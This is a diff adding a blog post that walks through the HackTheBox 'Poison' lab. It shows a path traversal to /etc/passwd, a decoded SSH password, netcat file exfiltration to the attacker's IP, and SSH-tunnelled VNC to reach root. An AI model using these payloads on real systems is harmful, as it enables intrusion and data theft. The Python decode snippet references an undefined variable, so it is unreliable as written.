@@ -1,0 +1,103 @@
+{% include 'header.html' %}
+
+<div class="date">09/09-2018</div>
+
+<h2>HackTheBox: poison by charix</h2>
+
+<p>First of, let's scan the host with nmap.</p>
+<pre class="code">
+<span class="host">root@kali:~#</span> nmap -sV -sC -oA nmap 10.10.10.84
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-09 08:29 EDT
+Nmap scan report for 10.10.10.84
+Host is up (0.050s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey:
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 18.35 seconds
+</pre>
+<!--<img class="img" src="/static/images/htb-poison/hosts.png" alt="Hosts">-->
+<p>Going to the ip returns a page with a script input, and a list of php scripts.</p>
+<!--<img class="img" src="/static/images/htb-poison/index.png" alt="Index">-->
+<p>Let's try the http://10.10.10.84/browse.php?file=listfiles.php.</p>
+<img class="img" src="/static/images/htb-poison/listfiles.png" alt="List Files" width=93%>
+<p>The last file - pwdbackup.txt looks interesting. Let's take a closer look on http://10.10.10.84/browse.php?file=pwdbackup.txt.</p>
+<img class="img" src="/static/images/htb-poison/pwdbackup.png" alt="Password Backup" width=95%>
+<p>Hmm, encoded 13 times. The equals sign in the end could indicate that it's base64 encoding. Decoding it 13 times with a simple python script returns the password. Remember, Charix, is the name of the creator of the box. </p>
+<pre class="code"><span class="host">root@kali:~#</span> python
+Python 2.7.15 (default, Jul 28 2018, 11:29:29)
+[GCC 8.1.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from base64 import b64decode
+>>> a = open('base64.txt', 'r').read().strip()
+>>>
+>>> for i in range(13):
+...     a = b64decode(f)
+...
+>>>
+>>> a
+'Charix!2#4%6&8(0'
+>>>
+</pre>
+<p>Let's check if the server is vulnerable to path traversal. Entering http://10.10.10.84/browse.php?file=../../../../../../../../../etc/passwd let's us take a look at the users.</p>
+
+<img class="img" src="/static/images/htb-poison/etcpasswd.png" alt="/etc/passwwd" width=95%>
+
+<p>The server has not excluded the password file from being fetched from the web. This verifies that a user named Charix is existing on the server. Let's try to connect through ssh, with Charix!2#4%6&8(0 as password.</p>
+
+<pre class="code">
+<span class="host">root@kali:~# </span>ssh charix@10.10.10.84
+Password for charix@Poison: Charix!2#4%6&8(0
+Last login: Sun Sep  9 18:46:10 2018 from 10.10.15.243
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+Welcome to FreeBSD!
+>> FreeBSD info <<
+charix@Poison:~ % ls
+LinEnum.sh	secret.zip	user.txt
+charix@Poison:~ % cat user.txt
+eaacdfb2d141b72a58923306360XXXXX
+charix@Poison:~ %
+</pre>
+<p>Piece of cake. Now, let's go for root.</p>
+<p>A zip file named secret.zip is located in the Charix directory. Let's copy it to our own machine to take a closer look.</p>
+<pre class="code"><span class="host">root@kali:~# </span>nc -l -p 1234 > secret.zip</pre>
+<pre class="code">charix@Poison:~ % nc -w 3 10.10.15.226 1234 < secret.zip</pre>
+<p>The zip can be extracted with the password: Charix!2#4%6&8(0.</p>
+<pre class="code"><span class="host">root@kali:~# </span>unzip secret.zip
+Archive:  secret.zip
+[secret.zip] secret password: Charix!2#4%6&8(0
+extracting: secret
+</pre>
+<p>When using cat to display the file content, Non-ISO extended-ASCII text is returned.</p>
+<pre class="code"><span class="host">root@kali:~# </span>file secret
+secret: Non-ISO extended-ASCII text, with no line terminators
+</pre>
+<p>Dead end. For now. Let's look at the users and proccesses running on Poison.</p>
+<p>There's a bash script called LinEnum.sh. It enumerates local information on a Linux host. Let's transfer it through netcat and run it.</p>
+<pre class="code">
+charix@Poison:~ % nc -l -p 1234 > LinEnum.sh
+</pre>
+<pre class="code"><span class="host">root@kali:~# </span>nc -w 3 10.10.10.84 1234 < LinEnum.sh
+</pre>
+<pre class="code">charix@Poison:~ % sh LinEnum.sh
+</pre>
+<p>The bash script revaels xvnc running under processes. Jackpot. A quick google search returned
+<a class="insideurls" href="https://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html">this result</a></p>
+<p> We'll try to pipe vnc through ssh and connect through vncviewer.</p>
+<pre class="code"><span class="host">root@kali:~# </span>ssh -NTL 9000:127.0.0.1:5901 charix@10.10.10.84
+</pre>
+<pre class="code"><span class="host">root@kali:~# </span>vncviewer -compresslevel 0 -passwd secret 127.0.0.1::9000
+</pre>
+<img class="img" src="/static/images/htb-poison/root.png" alt="vncviewer">
+<p>Aaand we're in. Cat root.txt and submit the flag.</p>
+
+{% include 'footer.html' %}
